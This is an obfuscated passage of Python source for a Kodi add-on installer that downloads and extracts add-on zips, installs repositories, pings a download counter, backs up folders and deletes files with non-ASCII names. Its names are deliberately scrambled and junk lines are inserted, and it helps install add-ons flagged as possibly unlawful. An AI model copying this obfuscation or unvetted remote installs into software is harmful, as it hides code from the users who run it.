 IiII111i1i11 ( 'folder' , 'Technology' , url + '&genre=tech' , 'grab_addons' , 'tech.png' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , 'Trailers' , url + '&genre=trailers' , 'grab_addons' , 'trailers.png' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , 'TV Shows' , url + '&genre=tv' , 'grab_addons' , 'tv.png' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , 'Misc.' , url + '&genre=other' , 'grab_addons' , 'other.png' , '' , '' , '' )
 if 41 - 41: I1ii11iIi11i * o0oOOoo - OO000 + Oo0Ooo
 if o0O . getSetting ( 'adult' ) == 'true' :
  IiII111i1i11 ( 'folder' , 'XXX' , url + '&genre=adult' , 'grab_addons' , 'adult.png' , '' , '' , '' )
  if 23 - 23: II111iiii % o0oOOo0O0Ooo + o0oOOo0O0Ooo + OOOOOOoo0O - OOOOOOoo0O
  if 62 - 62: o0oOOo0O0Ooo
def iI11IIiIiIii1 ( name , zip_link , repo_link , repo_id , addon_id , provider_name , forum , data_path ) :
 print "############# ADDON INSTALL #################"
 forum = str ( forum )
 repo_id = str ( repo_id )
 ii1i1I1 = 1
 ooOOO0OO = 1
 O0OOOO = 1
 iI = xbmc . translatePath ( os . path . join ( ooooooO0oo , addon_id ) )
 if 22 - 22: OooO00OOoO00 + iIii1I11I1II1
 if os . path . exists ( iI ) :
  IIIii1iiIi = 1
  if 63 - 63: I1ii11iIi11i
 else :
  IIIii1iiIi = 0
  if 6 - 6: o0oOOoo / I1ii11iIi11i
 oOooO00o0O = xbmc . translatePath ( os . path . join ( IiIIIi1iIi , name + '.zip' ) )
 OOo0 = xbmc . translatePath ( os . path . join ( ooooooO0oo , addon_id ) )
 if 35 - 35: i1IIi - iIii1I11I1II1 + i1IIi
 Ooo . create ( "Installing Addon" , "Please wait whilst your addon is installed" , '' , '' )
 if 86 - 86: iIii1I11I1II1 + OoOoOO00 . i11iIiiIii - OO000
 try :
  downloader . download ( repo_link , oOooO00o0O , Ooo )
  extract . all ( oOooO00o0O , ooooooO0oo , Ooo )
  if 51 - 51: OoOoOO00
 except :
  if 14 - 14: oOO00 % ooOo % Oo0Ooo - i11iIiiIii
  try :
   downloader . download ( zip_link , oOooO00o0O , Ooo )
   extract . all ( oOooO00o0O , ooooooO0oo , Ooo )
   if 53 - 53: OO000 % Oo0Ooo
  except :
   if 59 - 59: Oo % iIii1I11I1II1 . i1IIi + II111iiii * oOO00
   try :
    if not os . path . exists ( OOo0 ) :
     os . makedirs ( OOo0 )
     if 41 - 41: OO000 % I1ii11iIi11i
    i11i1ii1I = o0OO0o0o00o ( data_path ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
    i1iIiIi1I = re . compile ( 'href="(.+?)"' , re . DOTALL ) . findall ( i11i1ii1I )
    if 37 - 37: OO000 % OoO0O00
    for oOooO0 in i1iIiIi1I :
     O0O0ooOOO = xbmc . translatePath ( os . path . join ( OOo0 , oOooO0 ) )
     if 70 - 70: o0oOOoo . O0 . i1Ii11i1i . O0 + i1IIi
     if addon_id not in oOooO0 and '/' not in oOooO0 :
      if 9 - 9: Oo0Ooo
      try :
       Ooo . update ( 0 , "Downloading [COLOR=darkcyan]" + oOooO0 + '[/COLOR]' , '' , 'Please wait...' )
       downloader . download ( data_path + oOooO0 , O0O0ooOOO , Ooo )
       if 99 - 99: OooO00OOoO00 - i1Ii11i1i - ooOo % OoO0O00
      except :
       print "failed to install" + oOooO0
       if 21 - 21: II111iiii % I1ii11iIi11i . i1IIi - OoooooooOO
     if '/' in oOooO0 and '..' not in oOooO0 and 'http' not in oOooO0 :
      iiOOOO0o = data_path + oOooO0
      i1I1iIi1IiI ( O0O0ooOOO , iiOOOO0o )
      if 11 - 11: II111iiii
   except :
    OO0o . ok ( "Error downloading add-on" , 'There was an error downloading [COLOR=darkcyan]' + name , '[/COLOR]Please consider updating the add-on portal with details or report the error on the forum at [COLOR=lime][B]noobsandnerds.com[/COLOR][/B]' )
    ii1i1I1 = 0
    if 95 - 95: oOO00 * I1ii11iIi11i % o0oOOoo % OO000 - OO000
 if ii1i1I1 == 1 :
  time . sleep ( 1 )
  Ooo . update ( 0 , "[COLOR=darkcyan]" + name + '[/COLOR]  [COLOR=lime]Successfully Installed[/COLOR]' , '' , 'Now installing repository' )
  time . sleep ( 1 )
  O00oo0ooO = xbmc . translatePath ( os . path . join ( ooooooO0oo , repo_id ) )
  if 97 - 97: I1ii11iIi11i + iIii1I11I1II1 . O0
  if ( repo_id != 'repository.xbmc.org' ) and not ( os . path . exists ( O00oo0ooO ) ) and ( repo_id != '' ) and ( 'superrepo' not in repo_id ) :
   Ooo0Oo0oo0 ( repo_id )
   if 83 - 83: i1Ii11i1i
  xbmc . sleep ( 2000 )
  if 48 - 48: II111iiii * Oo * i1Ii11i1i
  if os . path . exists ( iI ) and IIIii1iiIi == 0 :
   i1iiiIii11 = 'http://noobsandnerds.com/TI/AddonPortal/downloadcount.php?id=%s' % ( addon_id )
   try :
    o0OO0o0o00o ( i1iiiIii11 )
   except :
    pass
  OOoOOO000O0 ( name , addon_id )
  xbmc . executebuiltin ( 'UpdateLocalAddons' )
  xbmc . sleep ( 1000 )
  xbmc . executebuiltin ( 'UpdateAddonRepos' )
  if 92 - 92: I1ii11iIi11i / O0
  if ooOOO0OO == 0 :
   OO0o . ok ( name + " Install Complete" , 'The add-on has been successfully installed but' , 'there was an error installing the repository.' , 'This will mean the add-on fails to update' )
   if 80 - 80: o0oOOo0O0Ooo - Oo + OoooooooOO
  if O0OOOO == 0 :
   OO0o . ok ( name + " Install Complete" , 'The add-on has been successfully installed but' , 'there was an error installing modules.' , 'This could result in errors with the add-on.' )
   if 98 - 98: Oo + i1IIi . I1IiiI - II111iiii - o0oOOo0O0Ooo
  if O0OOOO != 0 and ooOOO0OO != 0 and forum != 'None' :
   OO0o . ok ( name + " Install Complete" , 'Please support the developer(s) [COLOR=dodgerblue]' + provider_name , '[/COLOR]Support for this add-on can be found at [COLOR=darkcyan]' + forum , '[/COLOR][CR]Visit [COLOR=orange]www.noobs[/COLOR][COLOR=dodgerblue]and[/COLOR][COLOR=orange]nerds.com[/COLOR] for all your Kodi needs.' )
   if 24 - 24: Oo0Ooo - i1IIi + OooO00OOoO00
  if O0OOOO != 0 and ooOOO0OO != 0 and forum == 'None' :
   OO0o . ok ( name + " Install Complete" , 'Please support the developer(s) [COLOR=dodgerblue]' + provider_name , '[/COLOR]No details of forum support have been given.' )
   if 38 - 38: OoooooooOO / I1ii11iIi11i . O0 / i1IIi / Oo0Ooo + iIii1I11I1II1
 xbmc . executebuiltin ( 'Container.Refresh' )
 if 96 - 96: OOOOOOoo0O
 if 18 - 18: OOOOOOoo0O * OooO00OOoO00 - OO000
def II1i1III ( name , contenttypes , repo_link , repo_id , addon_id , provider_name , forum , data_path ) :
 print "############# RECOMMENDED ADDON INSTALL #################"
 iI = xbmc . translatePath ( os . path . join ( ooooooO0oo , addon_id ) )
 forum = str ( forum )
 if 34 - 34: i1Ii11i1i - i11iIiiIii / iIii1I11I1II1
 if not os . path . exists ( iI ) :
  OOOo = 1
  if 79 - 79: OoOoOO00 % oOO00 % Oo0Ooo
 else :
  OOOo = 0
  if 29 - 29: OoooooooOO . I1IiiI % I1ii11iIi11i - OOOOOOoo0O
 repo_id = str ( repo_id )
 O00oo0ooO = xbmc . translatePath ( os . path . join ( ooooooO0oo , repo_id ) )
 if 8 - 8: i1IIi
 if os . path . exists ( iI ) :
  IIIii1iiIi = 1
  iIiI1 = OO0o . yesno ( 'Add-on Already Installed' , 'This add-on has already been detected on your system. Would you like to remove the old version and re-install? There should be no need for this unless you\'ve manually opened up the add-on code and edited in a text editor.' )
  if 37 - 37: OoO0O00 * i11iIiiIii / Oo % i1Ii11i1i
  if iIiI1 == 1 :
   ooo0 ( iI )
   OOOo = 1
 else :
  IIIii1iiIi = 0
  if 55 - 55: Oo0Ooo
 if OOOo == 1 :
  if 77 - 77: II111iiii
  if ( repo_id != 'repository.xbmc.org' ) and not ( os . path . exists ( O00oo0ooO ) ) and ( repo_id != '' ) and ( 'superrepo' not in repo_id ) :
   Ooo0Oo0oo0 ( repo_id )
   if 16 - 16: I1IiiI * II111iiii / iIii1I11I1II1 - OOOOOOoo0O
  if not os . path . exists ( iI ) :
   os . makedirs ( iI )
   if 3 - 3: I1IiiI * o0oOOoo + II111iiii - OoO0O00
  OOOOOoOO0OOoo = os . path . join ( ooooooO0oo , addon_id , 'addon.xml' )
  IIIi11IiIiii = os . path . join ( ooooooO0oo , addon_id , 'default.py' )
  if 38 - 38: Oo0Ooo - OooO00OOoO00 . Oo0Ooo
  shutil . copyfile ( OOOO , OOOOOoOO0OOoo )
  if 38 - 38: i1IIi + OO000
  Oo00O0ooOO = open ( os . path . join ( OOOOOoOO0OOoo ) , mode = 'r' )
  IiiI = Oo00O0ooOO . read ( )
  Oo00O0ooOO . close ( )
  if 19 - 19: II111iiii
  if 72 - 72: OoooooooOO / I1IiiI + OO000 / OoOoOO00 * OO000
  Ii1iIi111i1i1 = re . compile ( 'testid[\s\S]*?' ) . findall ( IiiI )
  o0o0 = Ii1iIi111i1i1 [ 0 ] if ( len ( Ii1iIi111i1i1 ) > 0 ) else 'None'
  IIOO0ooOo0OoOo0 = re . compile ( 'testname[\s\S]*?' ) . findall ( IiiI )
  I11IIIi = IIOO0ooOo0OoOo0 [ 0 ] if ( len ( IIOO0ooOo0OoOo0 ) > 0 ) else 'None'
  oOoi1i = re . compile ( 'testprovider[\s\S]*?' ) . findall ( IiiI )
  IIIiiiI = oOoi1i [ 0 ] if ( len ( oOoi1i ) > 0 ) else 'None'
  OoO00oo00 = re . compile ( 'testprovides[\s\S]*?' ) . findall ( IiiI )
  Oo0Oo0O = OoO00oo00 [ 0 ] if ( len ( OoO00oo00 ) > 0 ) else 'None'
  iiiI1i11Ii = IiiI . replace ( o0o0 , addon_id ) . replace ( I11IIIi , name ) . replace ( IIIiiiI , provider_name ) . replace ( Oo0Oo0O , contenttypes )
  if 16 - 16: Oo0Ooo / i11iIiiIii
  oo00IIIIIIIiI = open ( OOOOOoOO0OOoo , mode = 'w+' )
  oo00IIIIIIIiI . write ( str ( iiiI1i11Ii ) )
  oo00IIIIIIIiI . close ( )
  if 12 - 12: OOOOOOoo0O . oOO00 . OoOoOO00 / O0
  OO0oOOo0o = open ( IIIi11IiIiii , mode = 'w' )
  OO0oOOo0o . write ( 'import xbmcplugin,xbmcgui,xbmc,xbmcaddon,os,sys\nAddonID="' + addon_id + '"\nAddonName="' + name + '"\ndialog=xbmcgui.Dialog()\nxbmc.executebuiltin("UpdateLocalAddons")\nxbmc.executebuiltin("UpdateAddonRepos")\nchoice=dialog.yesno(AddonName+" Add-on Requires Update","This add-on may still be in the process of the updating. We recommend waiting but if you\'ve already tried that and it\'s not updating you can try re-installing via the backup method in Maintenance.",yeslabel="Install Option 2", nolabel="Wait...")\nif choice == 1: xbmc.executebuiltin(\'ActivateWindow(10001,"plugin://plugin.program.tbs/?mode=grab_addons&url=%26redirect%26addonid%3d\'+AddonID+\'")\')\nxbmcplugin.endOfDirectory(int(sys.argv[1]))' )
  OO0oOOo0o . close ( )
  if 50 - 50: OOOOOOoo0O . I1ii11iIi11i . OoO0O00 * OooO00OOoO00 + II111iiii % i11iIiiIii
  xbmc . sleep ( 1000 )
  if 8 - 8: o0oOOoo * O0
  if os . path . exists ( iI ) and IIIii1iiIi == 0 :
   i1iiiIii11 = 'http://noobsandnerds.com/TI/AddonPortal/downloadcount.php?id=%s' % ( addon_id )
   try :
    o0OO0o0o00o ( i1iiiIii11 )
   except :
    pass
  xbmc . executebuiltin ( 'UpdateLocalAddons' )
  xbmc . executebuiltin ( 'UpdateAddonRepos' )
  OO0o . ok ( name + " Install Complete" , '[COLOR=dodgerblue]' + name + '[/COLOR] has now been installed, please allow a few moments for Kodi to update the add-on and it\'s dependencies.' )
  if 73 - 73: o0oOOo0O0Ooo / ooOo / OooO00OOoO00 / OoO0O00
 xbmc . executebuiltin ( 'Container.Refresh' )
 if 11 - 11: OoOoOO00 + oOO00 - OoooooooOO / OoO0O00
 if 34 - 34: o0oOOoo
def i1iI1IIi11i1II ( name , contenttypes , repo_link , repo_id , addon_id , provider_name , forum , data_path ) :
 print "############# INSTALL NON APPROVED ADDON #################"
 O00oo0ooO = xbmc . translatePath ( os . path . join ( ooooooO0oo , repo_id ) )
 iI = xbmc . translatePath ( os . path . join ( ooooooO0oo , addon_id ) )
 if 73 - 73: o0oOOo0O0Ooo - I1IiiI * i1IIi / i11iIiiIii * Oo % II111iiii
 if os . path . exists ( iI ) :
  if 56 - 56: OoooooooOO * Oo0Ooo . Oo0Ooo . I1ii11iIi11i
  iIiI1 = OO0o . yesno ( 'Add-on Already Installed' , 'This add-on has already been detected on your system. Would you like to remove the old version and re-install? There should be no need for this unless you\'ve manually opened up the add-on code and edited in a text editor.' )
  if 24 - 24: Oo0Ooo . OooO00OOoO00 * OO000 % OOOOOOoo0O / Oo
  if iIiI1 == 1 :
   ooo0 ( iI )
   if 58 - 58: I1IiiI - I1ii11iIi11i % O0 . I1IiiI % OoO0O00 % oOO00
 if os . path . exists ( O00oo0ooO ) :
  if 87 - 87: ooOo - i11iIiiIii
  if os . path . exists ( iI ) :
   IIIii1iiIi = 1
   if 78 - 78: i11iIiiIii / iIii1I11I1II1 - o0oOOo0O0Ooo
  else :
   IIIii1iiIi = 0
   if 23 - 23: OooO00OOoO00
  iIiI1 = OO0o . yesno ( 'WARNING!' , '[COLOR=orange]This Add-on may be unlawful in your region.[/COLOR][CR]The repository required for installation of this add-on has been detected on your system. Would you like to continue to the Kodi addon browser to install?' )
  if 40 - 40: o0oOOo0O0Ooo - II111iiii / Oo0Ooo
  if iIiI1 == 1 :
   if 14 - 14: I1ii11iIi11i
   if 'video' in contenttypes :
    xbmc . executebuiltin ( 'ActivateWindow(10040,"addons://' + repo_id + '/xbmc.addon.video/?",return)' )
    if 5 - 5: o0oOOo0O0Ooo . iIii1I11I1II1 % iIii1I11I1II1
   elif 'executable' in contenttypes :
    xbmc . executebuiltin ( 'ActivateWindow(10040,"addons://' + repo_id + '/xbmc.addon.executable/?",return)' )
    if 56 - 56: OoooooooOO - OooO00OOoO00 - i1IIi
   elif 'audio' in contenttypes :
    xbmc . executebuiltin ( 'ActivateWindow(10040,"addons://' + repo_id + '/xbmc.addon.audio/?",return)' )
    if 8 - 8: i1Ii11i1i / Oo . I1IiiI + I1ii11iIi11i / i11iIiiIii
  xbmc . sleep ( 2000 )
  if 31 - 31: o0oOOoo - iIii1I11I1II1 + OOOOOOoo0O . Oo0Ooo / oOO00 % iIii1I11I1II1
  if os . path . exists ( iI ) and IIIii1iiIi == 0 :
   i1iiiIii11 = 'http://noobsandnerds.com/TI/AddonPortal/downloadcount.php?id=%s' % ( addon_id )
   try :
    o0OO0o0o00o ( i1iiiIii11 )
   except :
    pass
 else :
  OO0o . ok ( 'WARNING!' , '[COLOR=orange]This add-on may possibly be unlawful in your region.[/COLOR][CR]If you\'ve investigated the legality of it and are happy to install then you must have the following repository installed: [COLOR=dodgerblue]' + repo_id + '[/COLOR]' )
  if 6 - 6: oOO00 * i11iIiiIii % iIii1I11I1II1 % i11iIiiIii + o0oOOo0O0Ooo / i1IIi
 xbmc . executebuiltin ( 'Container.Refresh' )
 if 53 - 53: OooO00OOoO00 + iIii1I11I1II1
 if 70 - 70: I1ii11iIi11i
def oo0O ( name , contenttypes , repo_link , repo_id , addon_id , provider_name , forum , data_path ) :
 OO0o . ok ( 'Add-on Not Approved' , 'Sorry there are no repository details for this add-on and it\'s been marked as potentially giving access to unlawful content. The most likely cause for this is the add-on has only been released via social media groups.' )
 if 6 - 6: Oo0Ooo . oOO00 / oOO00 - i11iIiiIii
 if 87 - 87: Oo0Ooo / O0 * oOO00 / o0oOOo0O0Ooo
def I1iiIII ( sign ) :
 IiII111i1i11 ( 'folder' , '[COLOR=gold][TOP 100][/COLOR] Show the most downloaded add-ons' , 'popular' , 'grab_addons' , '' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , '[COLOR=darkcyan][Manual Search][/COLOR] Type in author/name/content' , 'desc=' , 'search_addons' , '' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , '[COLOR=dodgerblue][Filter Results][/COLOR] By Genres' , 'p' , 'addon_genres' , '' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , '[COLOR=dodgerblue][Filter Results][/COLOR] By Countries' , 'p' , 'addon_countries' , '' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , '[COLOR=dodgerblue][Filter Results][/COLOR] By Kodi Categories' , 'p' , 'addon_categories' , '' , '' , '' , '' )
 IiII111i1i11 ( '' , '[COLOR=orange][Kodi Add-on Browser][/COLOR] Install From Zip' , '' , 'install_from_zip' , '' , '' , '' , '' )
 IiII111i1i11 ( '' , '[COLOR=orange][Kodi Add-on Browser][/COLOR] Browse My Repositories' , '' , 'browse_repos' , '' , '' , '' , '' )
 IiII111i1i11 ( '' , '[COLOR=orange][Kodi Add-on Browser][/COLOR] Check For Add-on Updates' , '' , 'check_updates' , '' , '' , '' , '' )
 if 16 - 16: ooOo + o0oOOoo / o0oOOo0O0Ooo
 if 82 - 82: oOO00 * i11iIiiIii % II111iiii - OoooooooOO
def OO0Ooo0 ( ) :
 for file in glob . glob ( os . path . join ( ooooooO0oo , '*' ) ) :
  oOo00O0oo00o0 = str ( file ) . replace ( ooooooO0oo , '[COLOR=red]REMOVE [/COLOR]' ) . replace ( 'plugin.' , '[COLOR=dodgerblue](PLUGIN) [/COLOR]' ) . replace ( 'audio.' , '' ) . replace ( 'video.' , '' ) . replace ( 'skin.' , '[COLOR=darkcyan](SKIN) [/COLOR]' ) . replace ( 'repository.' , '[COLOR=orange](REPOSITORY) [/COLOR]' ) . replace ( 'script.' , '[COLOR=cyan](SCRIPT) [/COLOR]' ) . replace ( 'metadata.' , '[COLOR=orange](METADATA) [/COLOR]' ) . replace ( 'service.' , '[COLOR=pink](SERVICE) [/COLOR]' ) . replace ( 'weather.' , '[COLOR=green](WEATHER) [/COLOR]' ) . replace ( 'module.' , '[COLOR=orange](MODULE) [/COLOR]' )
  oooO00o0 = ( os . path . join ( file , 'icon.png' ) )
  o0o00oO0oo000 = ( os . path . join ( file , 'fanart.jpg' ) )
  IiII111i1i11 ( '' , oOo00O0oo00o0 , file , 'remove_addons' , oooO00o0 , o0o00oO0oo000 , '' , '' )
  if 89 - 89: OoO0O00 + oOO00 * i1Ii11i1i
  if 28 - 28: OoooooooOO . ooOo % I1ii11iIi11i / i1IIi / Oo
def III1I1I ( ) :
 o0O . openSettings ( sys . argv [ 0 ] )
 xbmc . executebuiltin ( 'Container.Refresh' )
 if 14 - 14: OO000 . i11iIiiIii
def i11i111IiI ( ) :
 oOooOOOoOo = xbmc . getInfoLabel ( "System.BuildVersion" )
 iII1iii = float ( oOooOOOoOo [ : 4 ] )
 if iII1iii < 14 :
  i1i1II11II1 = os . path . join ( oooooOoo0ooo , 'xbmc.log' )
 else :
  i1i1II11II1 = os . path . join ( oooooOoo0ooo , 'kodi.log' )
  if 5 - 5: Oo0Ooo - I1ii11iIi11i % ooOo - II111iiii . I1IiiI + OOOOOOoo0O
 try :
  iiIi1I1i1 = open ( i1i1II11II1 , mode = 'r' )
  IiiI = iiIi1I1i1 . read ( )
  iiIi1I1i1 . close ( )
 except :
  try :
   iiIi1I1i1 = open ( os . path . join ( O0o0Oo , 'temp' , 'kodi.log' ) , mode = 'r' )
   IiiI = iiIi1I1i1 . read ( )
   iiIi1I1i1 . close ( )
  except :
   try :
    iiIi1I1i1 = open ( os . path . join ( O0o0Oo , 'temp' , 'xbmc.log' ) , mode = 'r' )
    IiiI = iiIi1I1i1 . read ( )
    iiIi1I1i1 . close ( )
   except :
    pass
    if 94 - 94: OoO0O00 . OoooooooOO + OooO00OOoO00 - OoOoOO00 / II111iiii
 O0ooOOOO0O0 = re . compile ( 'External storage path = (.+?);' ) . findall ( IiiI )
 i1IIi1i1Ii1 = O0ooOOOO0O0 [ 0 ] if ( len ( O0ooOOOO0O0 ) > 0 ) else ''
 return i1IIi1i1Ii1
 if 45 - 45: iIii1I11I1II1 . ooOo / OoOoOO00 / oOO00
 if 55 - 55: oOO00
def IIiIiII ( sourcefile , destfile , message_header , message1 , message2 , message3 , exclude_dirs , exclude_files ) :
 Ooo00o0oOo0O0O = zipfile . ZipFile ( destfile , 'w' , zipfile . ZIP_DEFLATED )
 oO0ooOO = len ( sourcefile )
 iii1iII1 = [ ]
 oO0O000oOo = [ ]
 if 53 - 53: iIii1I11I1II1 + o0oOOo0O0Ooo - OoOoOO00 - ooOo / o0oOOoo % i11iIiiIii
 Ooo . create ( message_header , message1 , message2 , message3 )
 if 3 - 3: OOOOOOoo0O . o0oOOoo % I1IiiI + I1ii11iIi11i
 for oo0o , o0IiiiI111I , III1I11i1iIi in os . walk ( sourcefile ) :
  if 69 - 69: Oo0Ooo * II111iiii * o0oOOoo . OOOOOOoo0O - I1ii11iIi11i
  for file in III1I11i1iIi :
   oO0O000oOo . append ( file )
   if 39 - 39: OO000 * I1IiiI % OoO0O00 . OoOoOO00
 iiii111IiIIi1 = len ( oO0O000oOo )
 if 74 - 74: iIii1I11I1II1 % OOOOOOoo0O * Oo * iIii1I11I1II1
 for oo0o , o0IiiiI111I , III1I11i1iIi in os . walk ( sourcefile ) :
  if 73 - 73: o0oOOo0O0Ooo % i1Ii11i1i . Oo
  o0IiiiI111I [ : ] = [ ooOOoOo for ooOOoOo in o0IiiiI111I if ooOOoOo not in exclude_dirs ]
  III1I11i1iIi [ : ] = [ oooO for oooO in III1I11i1iIi if oooO not in exclude_files and not 'crashlog' in oooO and not 'stacktrace' in oooO ]
  if 12 - 12: II111iiii
  for file in III1I11i1iIi :
   if 2 - 2: i1IIi - I1IiiI + OooO00OOoO00 . II111iiii
   try :
    iii1iII1 . append ( file )
    iIIiI1iiI = len ( iii1iII1 ) / float ( iiii111IiIIi1 ) * 100
    Ooo . update ( 0 , "Backing Up" , '[COLOR darkcyan]%s[/COLOR]' % ooOOoOo , 'Please Wait' )
    I11Ii111I = os . path . join ( oo0o , file )
    if 98 - 98: iIii1I11I1II1 + i1Ii11i1i % OoOoOO00 + OooO00OOoO00 % OoOoOO00
   except :
    print "Unable to backup file: " + file
    if 24 - 24: ooOo * i1Ii11i1i
   if not 'temp' in o0IiiiI111I :
    if 40 - 40: OO000 - OoOoOO00 * OoOoOO00 . OoOoOO00 + OoooooooOO
    if not I1IiI in o0IiiiI111I :
     if 77 - 77: iIii1I11I1II1 . OO000 % ooOo / OO000
     try :
      oOO0OO = '01/01/1980'
      OO0OoOo0OOO = time . strftime ( '%d/%m/%Y' , time . gmtime ( os . path . getmtime ( I11Ii111I ) ) )
      if 47 - 47: OoooooooOO % O0 * OOOOOOoo0O . OO000
      if OO0OoOo0OOO > oOO0OO :
       Ooo00o0oOo0O0O . write ( I11Ii111I , I11Ii111I [ oO0ooOO : ] )
       if 38 - 38: O0 - oOO00 % i1Ii11i1i
     except :
      print "Unable to backup file: " + file
      if 64 - 64: iIii1I11I1II1
 Ooo00o0oOo0O0O . close ( )
 Ooo . close ( )
 if 15 - 15: I1ii11iIi11i + Oo / I1ii11iIi11i / i1Ii11i1i
 if 31 - 31: o0oOOoo + O0 + o0oOOoo . iIii1I11I1II1 + Oo0Ooo / o0oOOo0O0Ooo
def II11i1IiIII ( sourcefile , destfile ) :
 Ooo00o0oOo0O0O = zipfile . ZipFile ( destfile , 'w' , zipfile . ZIP_DEFLATED )
 oO0ooOO = len ( sourcefile )
 iii1iII1 = [ ]
 oO0O000oOo = [ ]
 if 67 - 67: Oo0Ooo / OOOOOOoo0O * OoooooooOO
 Ooo . create ( "Backing Up Files" , "Archiving..." , '' , 'Please Wait' )
 if 100 - 100: O0 . OooO00OOoO00 . OoO0O00 + O0 * ooOo
 for oo0o , o0IiiiI111I , III1I11i1iIi in os . walk ( sourcefile ) :
  if 42 - 42: ooOo % OoooooooOO + o0oOOo0O0Ooo
  for file in III1I11i1iIi :
   oO0O000oOo . append ( file )
   if 56 - 56: OoooooooOO + I1ii11iIi11i - OOOOOOoo0O
 iiii111IiIIi1 = len ( oO0O000oOo )
 if 24 - 24: o0oOOo0O0Ooo + o0oOOoo + OooO00OOoO00 - iIii1I11I1II1
 for oo0o , o0IiiiI111I , III1I11i1iIi in os . walk ( sourcefile ) :
  if 49 - 49: OooO00OOoO00 . o0oOOoo * OoOoOO00 % oOO00 . O0
  for file in III1I11i1iIi :
   iii1iII1 . append ( file )
   iIIiI1iiI = len ( iii1iII1 ) / float ( iiii111IiIIi1 ) * 100
   Ooo . update ( int ( iIIiI1iiI ) , "Backing Up" , '[COLOR darkcyan]%s[/COLOR]' % file , 'Please Wait' )
   I11Ii111I = os . path . join ( oo0o , file )
   if 48 - 48: O0 * OO000 - O0 / OO000 + OoOoOO00
   if not 'temp' in o0IiiiI111I :
    if 52 - 52: OoO0O00 % OO000 * II111iiii
    if not I1IiI in o0IiiiI111I :
     if 4 - 4: OooO00OOoO00 % O0 - OoooooooOO + o0oOOoo . ooOo % II111iiii
     import time
     oOO0OO = '01/01/1980'
     OO0OoOo0OOO = time . strftime ( '%d/%m/%Y' , time . gmtime ( os . path . getmtime ( I11Ii111I ) ) )
     if 9 - 9: II111iiii * II111iiii . i11iIiiIii * iIii1I11I1II1
     if OO0OoOo0OOO > oOO0OO :
      Ooo00o0oOo0O0O . write ( I11Ii111I , I11Ii111I [ oO0ooOO : ] )
 Ooo00o0oOo0O0O . close ( )
 Ooo . close ( )
 if 18 - 18: OoO0O00 . II111iiii % OoOoOO00 % OO000
 if 87 - 87: iIii1I11I1II1 . OoooooooOO * OoOoOO00
def OOOoo0ooOo00O ( ) :
 Ii1i1I1 = OO0o . browse ( 3 , 'Select the folder you want to scan' , 'files' , '' , False , False )
 oO0ooOO = len ( Ii1i1I1 )
 iii1iII1 = [ ]
 oO0O000oOo = [ ]
 if 97 - 97: i1Ii11i1i . o0oOOoo - i1Ii11i1i + I1IiiI * II111iiii
 Ooo . create ( 'Checking File Structure' , '' , 'Please wait...' , '' )
 if 10 - 10: OO000 + OooO00OOoO00 % OoooooooOO - I1IiiI
 iIiI1 = OO0o . yesno ( 'Delete or Scan?' , 'Do you want to delete all filenames with special characters or would you rather just scan and view the results in the log?' , yeslabel = 'Delete' , nolabel = 'Scan' )
 if 70 - 70: Oo - OOOOOOoo0O
 iIi = open ( OOoOO0oo0ooO , mode = 'w+' )
 iiO0O0o0oO0O00 = open ( O0o0O00Oo0o0 , mode = 'w+' )
 if 70 - 70: i1Ii11i1i + ooOo
 for oo0o , o0IiiiI111I , III1I11i1iIi in os . walk ( Ii1i1I1 ) :
  if 93 - 93: i1Ii11i1i + OO000
  for file in III1I11i1iIi :
   oO0O000oOo . append ( file )
   if 33 - 33: O0
 iiii111IiIIi1 = len ( oO0O000oOo )
 if 78 - 78: O0 / II111iiii * OoO0O00
 for oo0o , o0IiiiI111I , III1I11i1iIi in os . walk ( Ii1i1I1 ) :
  if 50 - 50: OoooooooOO - iIii1I11I1II1 + i1IIi % i1Ii11i1i - iIii1I11I1II1 % O0
  o0IiiiI111I [ : ] = [ ooOOoOo for ooOOoOo in o0IiiiI111I ]
  III1I11i1iIi [ : ] = [ oooO for oooO in III1I11i1iIi ]
  if 58 - 58: oOO00 + iIii1I11I1II1
  for file in III1I11i1iIi :
   if 65 - 65: II111iiii - i1Ii11i1i % o0oOOo0O0Ooo - OoOoOO00 * OOOOOOoo0O + OO000
   iii1iII1 . append ( file )
   iIIiI1iiI = len ( iii1iII1 ) / float ( iiii111IiIIi1 ) * 100
   Ooo . update ( 0 , "Checking for non ASCII files" , '[COLOR yellow]%s[/COLOR]' % ooOOoOo , 'Please Wait' )
   if 79 - 79: o0oOOoo . OoOoOO00 % i1Ii11i1i - Oo0Ooo
   try :
    file . encode ( 'ascii' )
    if 69 - 69: o0oOOoo - o0oOOo0O0Ooo . o0oOOoo
   except UnicodeDecodeError :
    iIiiIi11IIi = ( str ( oo0o ) + '/' + str ( file ) ) . replace ( '\\' , '/' ) . replace ( ':/' , ':\\' )
    if 64 - 64: OoooooooOO . I1ii11iIi11i % O0 + I1IiiI - o0oOOo0O0Ooo
    print " non-ASCII file status logged successfully: " + iIiiIi11IIi
    if iIiI1 != 1 :
     iIi . write ( '[COLOR=dodgerblue]Non-ASCII File:[/COLOR]\n' )
     for ooo0oo00O00oO in oOOooooo0OoO0 ( iIiiIi11IIi , 75 ) :
      iIi . write ( ooo0oo00O00oO + '[CR]' )
     iIi . write ( '\n' )
    if iIiI1 == 1 :
     try :
      os . remove ( iIiiIi11IIi )
      print "### SUCCESS - deleted " + iIiiIi11IIi
      iIi . write ( '[COLOR=dodgerblue]SUCCESSFULLY DELETED:[/COLOR]\n' )
      for ooo0oo00O00oO in oOOooooo0OoO0 ( iIiiIi11IIi , 75 ) :
       iIi . write ( ooo0oo00O00oO + '[CR]' )
      iIi . write ( '\n' )
      if 11 - 11: i1IIi % OoO0O00 % OOOOOOoo0O
     except :
      print "######## FAILED TO REMOVE: " + iIiiIi11IIi
      print "######## Make sure you manually remove this file ##########"
      iiO0O0o0oO0O00 . write ( '[COLOR=red]FAILED TO DELETE:[/COLOR]\n' )
      for ooo0oo00O00oO in oOOooooo0OoO0 ( iIiiIi11IIi , 75 ) :
       iiO0O0o0oO0O00 . write ( ooo0oo00O00oO + '[CR]' )
      iiO0O0o0oO0O00 . write ( '\n' )
      if 99 - 99: o0oOOoo / iIii1I11I1II1 - OO000 * I1ii11iIi11i % I1IiiI
 iiO0O0o0oO0O00 . close ( )
 iIi . close ( )
